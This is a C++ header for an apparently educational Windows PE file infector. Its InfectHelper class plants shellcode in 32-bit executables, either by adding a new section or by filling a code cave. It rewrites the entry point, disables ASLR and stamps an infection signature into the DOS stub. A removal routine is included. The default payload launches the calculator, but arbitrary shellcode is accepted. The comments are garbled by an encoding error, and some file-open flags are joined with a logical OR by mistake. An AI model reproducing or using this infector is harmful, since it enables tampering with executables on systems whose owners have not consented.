#pragma once
#include <string>
#include <Windows.h>
#include <fstream>
#include <iostream>
#include "pe.hpp"

#define SMALL_SHELLCODE_LEN 1024

// ��Ⱦ��ǳ���
#define INFECT_SIGN_LENGTH 12
// ��Ⱦ���
const CHAR INFECT_SIGN[INFECT_SIGN_LENGTH] = { "hi, qiufeng" };
// ��Ⱦ����
enum InfectType {
	ADD_SECTION, CODE_CAVE
};

std::string GetCalcuatorShellcode32(DWORD entry_point);


// ��Ⱦ�ṹ�壬�ýṹ��ᱻд�� Dos Stub
typedef struct _InfectPadding {
	CHAR sign[INFECT_SIGN_LENGTH] = { "hi, qiufeng" };
	// ԭʼ��ڵ� RVA
	DWORD old_entry_point;
	// ����Ⱦ�Ľ�
	BYTE name[8];
	InfectType type;
} InfectPadding;

class InfectHelper {
private:
	std::string path;
	PEHelper helper;

	// ��������һ�����ȵ��������ն�
	bool FindCodeCave(const DWORD len, CodeCave &cave) {
		bool flag = false;
		std::vector<CodeCave> cave_vector(std::move(helper.SearchCodeCave()));
		// ��һ���ʺ�ע��Ĵ���ն�
		for (auto it = cave_vector.begin(); it != cave_vector.end(); it++) {
			if (it->size >= len) {
				cave = *it;
				flag = true;
				break;
			}
		}
		if (!flag) {
			std::cerr << "shellcode̫������ѡ��������ע�뷽��!" << std::endl;
		}
		return flag;
	}

public:
	InfectHelper(std::string file_path) : path(file_path) {
		helper.LoadPE(path);
	};

	InfectPadding LoadInfectPadding() {
		std::ifstream file(path, std::ios::binary);
		file.seekg(helper.GetDosStubFOA(), std::ios::beg);
		
		CHAR* buffer = new CHAR[sizeof(InfectPadding) + 1];
		// �ȶ��뻺����
		file.read(buffer, sizeof(InfectPadding));

		InfectPadding pad;
		std::memcpy(&pad, buffer, sizeof(InfectPadding));
		delete[] buffer;
		file.close();

		return pad;
	}

	void WriteInfectPadding(InfectPadding pad) {
		std::ofstream file(path, std::ios::binary || std::ios::ate);
		file.seekp(helper.GetDosStubFOA(), std::ios::beg);

		CHAR* buffer = new CHAR[sizeof(InfectPadding) + 1];
		std::memcpy(buffer, &pad, sizeof(InfectPadding));
		file.write(buffer, sizeof(InfectPadding));

		delete[] buffer;
		file.close();
	}

	bool IsInfected() {
		InfectPadding pad = LoadInfectPadding();
		if (std::memcmp(pad.sign, &INFECT_SIGN[0], INFECT_SIGN_LENGTH)) return false;
		return true;
	}

	bool InfectByAddSection(const std::string name = ".qiufeng",
							std::string shellcode = "") {
		// ����Ѿ���Ⱦ�����ٸ�Ⱦ
		if (IsInfected()) {
			std::cerr << "�����Ѿ�����Ⱦ!" << std::endl;
			return false;
		}
		// �ر� ASLR
		helper.CloseASLR();

		InfectPadding pad;
		pad.type = ADD_SECTION;
		std::memcpy(pad.name, name.c_str(), IMAGE_SIZEOF_SHORT_NAME);
		// ����ɵ���ڵ�
		pad.old_entry_point = helper.GetEntryPointRVA();

		switch (helper.GetPEType()) {
		case PE32: {
			// �޸���ڵ�� RVA ָ���½�
			// ����ǰ 4 ���ֽڴ洢���� OEP
			helper.SetEntryPoint(helper.GetNewSectionRVA() + 4);
			if (!shellcode.size()) {
				shellcode = GetCalcuatorShellcode32(pad.old_entry_point + helper.GetImageBase());
			}
			// ����½�
			helper.AddNewSection(shellcode, pad.name);
			break;
		}
		case PE64: {
			std::cerr << "δʵ�� PE64 �ĸ�Ⱦ" << std::endl;
			std::exit(EXIT_FAILURE);
		}
		}
		// д�� padding
		WriteInfectPadding(pad);
		// ���¼���
		helper.LoadPE(path);
		
		return true;
	}

	// ����ն�ע��
	// �����������ע�룬����ն�ע����Ҫ�޸ĵĵط��Ƚ���
	// 1. ע��ն�
	// 2. �޸���ڵ�
	// TODO
	// �ȿ��Ǽ�һ����������ѡ��һ������ע��Ľ�ע��
	bool InfectByCodeCave(std::string shellcode = "", 
						  //std::string name = "",
						  // ע���������ն�ͷ��ƫ��
						  const DWORD offset = 0x20) {
		// ����Ѿ���Ⱦ�����ٸ�Ⱦ
		if (IsInfected()) {
			std::cerr << "�����Ѿ�����Ⱦ!" << std::endl;
			return false;
		}
		
		if (!shellcode.size()) {
			switch (helper.GetPEType()) {
			case PE32: {
				shellcode = GetCalcuatorShellcode32(helper.GetEntryPointRVA() + helper.GetImageBase());
				break;
			}
			case PE64: {
				std::cerr << "��֧��64λ�� shellcode" << std::endl;
				std::exit(EXIT_FAILURE);
			}
			}
		}
		// �ر� ASLR
		helper.CloseASLR();
		// ��������ն�
		CodeCave cave;
		if (!FindCodeCave(shellcode.size() + offset, cave)) return false;

		InfectPadding pad;
		pad.type = CODE_CAVE;
		std::memcpy(pad.name, cave.name, IMAGE_SIZEOF_SHORT_NAME);
		// ����ɵ���ڵ�
		pad.old_entry_point = helper.GetEntryPointRVA();

		std::ofstream file(path, std::ios::beg || std::ios::ate);

		switch (helper.GetPEType()) {
		case PE32: {
			// �µ� RVA = �ն���ʼRVA + offset + 4
			helper.SetEntryPoint(cave.start_rva + offset + 4);
			file.seekp(cave.start_foa + offset, std::ios::beg);
			// ע��
			file.write(shellcode.c_str(), shellcode.size());
			break;
		}
		case PE64: {
			std::cerr << "δʵ�� PE64 �ĸ�Ⱦ" << std::endl;
			std::exit(EXIT_FAILURE);
		}
		}
		// д�� padding
		WriteInfectPadding(pad);
		// ���¼���
		helper.LoadPE(path);

		file.close();
		return true;
	}

	bool RemoveVirus() {
		if (!IsInfected()) {
			std::cerr << "�ļ�û�б���Ⱦ" << std::endl;
			return false;
		}
		InfectPadding pad = LoadInfectPadding();
		std::ofstream file(path, std::ios::binary || std::ios::ate);

		switch (pad.type) {
		case ADD_SECTION: {
			// �ظ�ԭʼ��ڵ�
			helper.SetEntryPoint(pad.old_entry_point);
			// TODO
			// ����ýڲ������һ������ôɾ���ýڲ��Ǻ�����
			// �����Ⱦ���
			std::memcpy(pad.sign, "by", 2);
			break;
		}
		case CODE_CAVE: {
			DWORD entry_point_foa(helper.RVAToFOA(helper.GetEntryPointRVA()));
			// �ظ�ԭʼ��ڵ�
			helper.SetEntryPoint(pad.old_entry_point);
			switch (helper.GetPEType()) {
			case PE32: {
				// ��Ҫ��ȥ���� OEP �� 4 ���ֽ�
				entry_point_foa -= 4;
				// ��Ҫ�� 0 �Ĵ�С�����ļ�����������
				int zero_buffer_len = helper.GetFileAlignment() - (entry_point_foa % helper.GetFileAlignment());
				zero_buffer_len %= helper.GetFileAlignment();
				std::string zero_buffer(zero_buffer_len, 0x00);
				// ע��������
				file.seekp(entry_point_foa, std::ios::beg);
				file.write(zero_buffer.c_str(), zero_buffer_len);
				// �����Ⱦ���
				std::memcpy(pad.sign, "by", 2);

				break;
			}
			case PE64: {
				std::cerr << "64λ�ն�ע�����δʵ��" << std::endl;
				break;
			}
			}
			std::memcpy(pad.sign, "by", 2);
			break;
		}
		}
		// д�� padding
		WriteInfectPadding(pad);
		// ���¼���
		helper.LoadPE(path);

		return true;
	}

};